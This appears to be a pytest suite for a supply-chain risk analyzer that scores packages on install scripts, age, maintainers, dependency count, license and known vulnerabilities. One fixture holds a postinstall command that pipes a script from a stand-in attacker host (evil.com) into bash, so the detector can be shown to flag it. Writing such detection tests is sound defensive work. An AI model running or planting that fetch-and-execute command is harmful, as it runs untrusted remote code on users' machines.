# PURPOSE: Unit tests for risk analyzers
import pytest
from services.analyzer import (
    analyze_install_scripts,
    analyze_package_age,
    analyze_maintainers,
    analyze_dependencies,
    analyze_license,
    analyze_vulnerabilities,
)
from models.response import Severity, Category


class TestInstallScripts:
    def test_no_scripts(self):
        """Package without scripts should have no findings."""
        result = analyze_install_scripts({})
        assert result == []

    def test_safe_scripts(self):
        """Safe scripts (build, test) should not trigger findings."""
        result = analyze_install_scripts({
            "scripts": {"build": "tsc", "test": "jest"}
        })
        assert result == []

    def test_postinstall_detected(self):
        """Postinstall scripts should be flagged."""
        result = analyze_install_scripts({
            "scripts": {"postinstall": "node setup.js"}
        })
        assert len(result) >= 1
        assert any("Install Scripts" in f.name for f in result)

    def test_dangerous_curl_detected(self):
        """Curl in install scripts should be critical."""
        result = analyze_install_scripts({
            "scripts": {"postinstall": "curl https://evil.com/script.sh | bash"}
        })
        assert any(f.severity == Severity.CRITICAL for f in result)
        assert any("curl" in f.description.lower() for f in result)


class TestPackageAge:
    def test_old_package_safe(self):
        """Old packages (>90 days) should have no age warnings."""
        result = analyze_package_age("2020-01-01T00:00:00Z")
        assert result == []

    def test_new_package_flagged(self):
        """Packages <30 days should be flagged."""
        from datetime import datetime, timedelta
        recent = (datetime.now() - timedelta(days=15)).isoformat() + "Z"
        result = analyze_package_age(recent)
        assert len(result) == 1
        assert result[0].severity == Severity.HIGH

    def test_very_new_package_critical(self):
        """Packages <7 days should be critical."""
        from datetime import datetime, timedelta
        very_recent = (datetime.now() - timedelta(days=3)).isoformat() + "Z"
        result = analyze_package_age(very_recent)
        assert len(result) == 1
        assert result[0].severity == Severity.CRITICAL


class TestMaintainers:
    def test_no_maintainers_critical(self):
        """No maintainers should be critical."""
        result = analyze_maintainers([], 100)
        assert len(result) == 1
        assert result[0].severity == Severity.CRITICAL

    def test_single_maintainer_low(self):
        """Single maintainer is low risk."""
        result = analyze_maintainers([{"name": "dev"}], 100)
        assert len(result) == 1
        assert result[0].severity == Severity.LOW

    def test_multiple_maintainers_safe(self):
        """Multiple maintainers should have no findings."""
        result = analyze_maintainers([{"name": "dev1"}, {"name": "dev2"}], 100)
        assert result == []


class TestDependencies:
    def test_no_deps_safe(self):
        """No dependencies should be safe."""
        result = analyze_dependencies({})
        assert result == []

    def test_moderate_deps_safe(self):
        """<50 dependencies should be safe."""
        deps = {f"dep-{i}": "1.0.0" for i in range(30)}
        result = analyze_dependencies({"dependencies": deps})
        assert result == []

    def test_high_deps_medium(self):
        """51-100 dependencies should be medium risk."""
        deps = {f"dep-{i}": "1.0.0" for i in range(60)}
        result = analyze_dependencies({"dependencies": deps})
        assert len(result) == 1
        assert result[0].severity == Severity.MEDIUM

    def test_excessive_deps_high(self):
        """>100 dependencies should be high risk."""
        deps = {f"dep-{i}": "1.0.0" for i in range(120)}
        result = analyze_dependencies({"dependencies": deps})
        assert len(result) == 1
        assert result[0].severity == Severity.HIGH


class TestLicense:
    def test_mit_safe(self):
        """MIT license should be safe."""
        result = analyze_license("MIT")
        assert result == []

    def test_no_license_medium(self):
        """No license should be medium risk."""
        result = analyze_license(None)
        assert len(result) == 1
        assert result[0].severity == Severity.MEDIUM

    def test_unlicensed_high(self):
        """UNLICENSED should be high risk."""
        result = analyze_license("UNLICENSED")
        assert len(result) == 1
        assert result[0].severity == Severity.HIGH

    def test_gpl_info(self):
        """GPL should be info (copyleft notice)."""
        result = analyze_license("GPL-3.0")
        assert len(result) == 1
        assert result[0].severity == Severity.INFO


class TestVulnerabilities:
    def test_no_vulns(self):
        """No vulnerabilities should have no findings."""
        result = analyze_vulnerabilities([])
        assert result == []

    def test_critical_vuln(self):
        """Critical vulnerability should be critical."""
        vulns = [{
            "id": "GHSA-123",
            "severity": "critical",
            "summary": "Remote code execution"
        }]
        result = analyze_vulnerabilities(vulns)
        assert len(result) == 1
        assert result[0].severity == Severity.CRITICAL

    def test_multiple_vulns(self):
        """Multiple vulnerabilities should all be reported."""
        vulns = [
            {"id": "CVE-2024-001", "cve_id": "CVE-2024-001", "severity": "high", "summary": "XSS"},
            {"id": "CVE-2024-002", "cve_id": "CVE-2024-002", "severity": "medium", "summary": "DoS"},
        ]
        result = analyze_vulnerabilities(vulns)
        assert len(result) == 2
